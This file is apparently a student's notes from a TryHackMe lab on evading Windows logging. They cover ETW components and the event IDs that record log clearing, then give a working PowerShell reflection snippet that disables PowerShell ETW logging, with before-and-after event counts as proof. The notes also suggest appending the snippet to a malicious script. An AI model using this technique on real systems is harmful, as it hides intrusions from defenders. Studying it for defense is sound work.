# Evading Logging and Monitoring
- Unlike anti-virus and EDR (Endpoint Detection and Response) solutions, logging creates a physical record of activity that can be analyzed for malicious activity.
- Once logs are created, they can be kept on the device or sent to an event collector/forwarder.
- Once they are off the device, the defense team decides how to aggregate them
- Generally accomplished using an indexer and a SIEM (Security Information and Event Manager).
- The primary target for an attacker is the event logs, managed and controlled by ETW (Event Tracing for Windows).
## Event Tracing
- ETW handles almost all event logging at both the application and kernel level
- Event Ids are a core feature of Windows Logging
- Events are sent and transferred in ZML format
### Extensions of ETW
- Component --> Purpose
````
Controllers -->	Build and configure sessions
Providers	--> Generate events
Consumers	--> Interpret events
````
- Example of Event Id `4624` `An account was successfully logged on`
````
Event ID:4624
Source:Security
Category:Logon/Logoff
Message:An account was successfully logged on.

Subject:
Security ID: NT AUTHORITY\\SYSTEM
Account Name: WORKSTATION123$
...
[ snip ]
...
Logon Type: 7

New Logon:
Security ID: CORPDOMAIN\\john.doe
Account Name: john.doe
...
[ snip ]
...
Process Information:
Process ID: 0x314
````
## Approaches to Log Evasion
- Common event IDs to avoid causing 
````
Event ID	Purpose
1102 --> Logs when the Windows Security audit log was cleared
104 --> Logs when the log file was cleared
1100 --> Logs when the Windows Event Log service was shut down
````
- The above event IDs can monitor the process of destroying logs or “log smashing.
## Tracing Instrumentation
- ETW is broken up into three separate components
- Event Controllers are used to build and configure sessions.
- We can think of the controller as the application that determines how and where data will flow.
- Event Providers are used to generate events.
- The controller will tell the provider how to operate, then collect logs from its designated source
- There are also four different types of providers with support for various functions and legacy systems.
````
MOF (Managed Object Format) 
Defines events from MOF classes. Enabled by one trace session at a time.
````
````
WPP (Windows Software Trace Preprocessor) 
Associated with TMF(Trace Message Format) files to decode information. Enabled by one trace session at a time.
````
````
Manifest-Based 
Defines events from a manifest. Enabled by up to eight trace sessions at a time.
````
````
TraceLogging
Self-describing events containing all required information. Enabled by up to eight trace sessions at a time.
````
- Event Consumers are used to interpret events.
-  The consumer will select sessions and parse events from that session or multiple at the same time. 
-  This is most commonly seen in the `“Event Viewer”`.
- ![image](https://user-images.githubusercontent.com/75596877/171702263-525e4588-6213-4e19-a749-92e33a0678d4.png)
### Overall Process
- Events originate from the providers. 
- Controllers will determine where the data is sent and how it is processed through sessions. 
- Consumers will save or deliver logs to be interpreted or analyzed.
## Reflection for Fun and Silence
- Within PowerShell, ETW providers are loaded into the session from a .NET assembly: `PSEtwLogProvider`
- In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup
- In the context of ETW (Event Tracing for Windows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.

- At a high level, PowerShell reflection can be broken up into four steps:
Obtain .NET assembly for PSEtwLogProvider.
Store a null value for etwProvider field.
Set the field for m_enabled to previously stored value.
At step one, we need to obtain the type for the PSEtwLogProvider assembly. The assembly is stored in order to access its internal fields in the next step.
````
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
````
- At step two, we are storing a value ($null) from the previous assembly to be used.
````
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
````
- At step three, we compile our steps together to overwrite the `m_enabled` field with the value stored in the previous line.
````
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
````
- We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.

- To prove the efficacy of the script, we can execute it and measure the number of returned events from a given command.
### Before 
````
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
7
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
11
````
### After
````
PS C:\Users\Administrator>.\reflection.ps1
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
````









